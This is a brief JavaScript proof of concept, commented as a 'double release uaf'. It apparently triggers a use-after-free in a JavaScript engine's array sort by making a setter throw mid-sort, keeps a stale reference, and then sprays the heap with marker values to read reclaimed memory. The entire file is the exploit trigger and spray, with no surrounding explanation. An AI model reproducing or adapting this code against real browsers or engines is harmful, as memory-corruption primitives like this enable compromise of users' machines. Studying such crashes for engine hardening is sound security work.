// bug class: double release uaf
let spray = new Array(100);
let a = [{hack:0}, 1, 2, 3, 4];
let refcopy = [a[0]];
a.__defineSetter__(3, ()=>{throw 1;});
try {
  a.sort(function(v) {if (v == a[0]) return 0; return 1;});
} catch (e) {}
a[0] = 0;
for (let i = 0; i < 1000; i++) {
  spray[i] = [13371337];
}
console.log(refcopy[0]);
